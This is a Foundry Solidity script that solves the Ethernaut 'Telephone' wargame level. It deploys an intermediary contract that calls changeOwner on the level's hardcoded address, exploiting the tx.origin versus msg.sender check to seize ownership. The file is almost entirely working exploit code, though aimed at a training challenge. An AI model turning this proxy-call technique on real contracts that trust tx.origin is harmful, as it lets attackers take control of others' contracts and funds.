// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/04_Telephone.sol";

contract ExploitScript is Script {
    address myAddress = vm.envAddress("ACCOUNT_ADDRESS");

    function run() external {
        vm.startBroadcast();

        TelephoneAttacker attacker = new TelephoneAttacker(0x5ac9D22d642Ba1ab5aa2Dd5bad078762B2cD09a0);    
        attacker.attack(myAddress);

        vm.stopBroadcast();
    }
}

contract TelephoneAttacker {
    
    Telephone public level04;
    
    constructor(address _target) {
        level04 = Telephone(_target);
    }
    
    function attack(address _newOwner) public {
        level04.changeOwner(_newOwner);
    }
}